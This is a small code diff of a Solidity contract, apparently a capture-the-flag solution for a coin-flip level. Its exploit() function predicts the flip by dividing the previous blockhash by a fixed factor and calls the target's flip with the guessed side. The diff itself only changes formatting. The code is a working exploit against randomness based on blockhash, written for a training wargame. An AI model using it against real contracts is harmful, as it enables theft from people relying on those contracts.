@@ -2,7 +2,7 @@
 pragma solidity ^0.6.0;
 
 import "../instances/Ilevel03.sol";
-import '@openzeppelin/contracts/math/SafeMath.sol';
+import "@openzeppelin/contracts/math/SafeMath.sol";
 
 contract Flipit {
     using SafeMath for uint256;
@@ -11,7 +11,6 @@ contract Flipit {
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     function exploit() external {
-
         uint256 blockValue = uint256(blockhash(block.number.sub(1)));
         uint256 coinFlip = blockValue.div(FACTOR);
         bool side = coinFlip == 1 ? true : false;
@@ -21,6 +20,5 @@ contract Flipit {
         } else {
             level3.flip(false);
         }
-        
     }
 }
